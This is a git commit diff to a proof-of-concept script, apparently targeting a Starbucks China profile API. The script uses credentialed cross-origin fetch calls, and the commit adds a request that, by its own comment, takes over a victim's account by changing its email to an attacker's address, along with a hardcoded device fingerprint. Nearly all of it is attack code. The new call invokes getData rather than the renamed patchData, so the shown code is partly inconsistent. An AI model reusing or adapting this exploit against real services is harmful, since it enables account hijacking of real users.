3b5a215b6c15417337ee57772d9118adbad05f79
koffdsa <51981550@qq.com>
2022-02-20 01:04:02 +0800

    Update get_information.js

--- poc/star/get_information.js
+++ poc/star/get_information.js
@@ -1,8 +1,8 @@
 
-async function postData(url = '', data = {}) {
+async function patchData(url = '', data = {}) {
   // Default options are marked with *
   const response = await fetch(url, {
-    method: 'POST', // *GET, POST, PUT, DELETE, etc.
+    method: 'PATCH', // *GET, POST, PUT, DELETE, etc.
     mode: 'cors', // no-cors, *cors, same-origin
     cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
     credentials: 'include', // include, *same-origin, omit
@@ -40,3 +40,8 @@ getData('https://profile.starbucks.com.cn/api/account/detail')
     console.log(data); // JSON data parsed by `data.json()` call
   });
 
+//Try to takeover victim's account by modify the email address to attacker belongs
+getData('https://profile.starbucks.com.cn/api/account/email',{"email":"attacker_johnstone@hotmail.com","device":{"deviceExternalCode":"EjIrFdsfj4Q2bQQM4IgP48CZid4svYFh7W93S1M-YBEYhRwbLX9jIvkC28hSdgx19RdfMknxyd_CynVEh77fADsjB8uEwd0g4HB7uHHSCTKxclIPc_evb6N1jYv_NwdR18vRtD0r4YN8bARte-zAgc4mbKwe87yV","timezone":"+08:00","browserName":"Chrome","userAgent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36","language":"zh-CN"}})
+  .then(data => {
+    console.log(data); // JSON data parsed by `data.json()` call
+  });
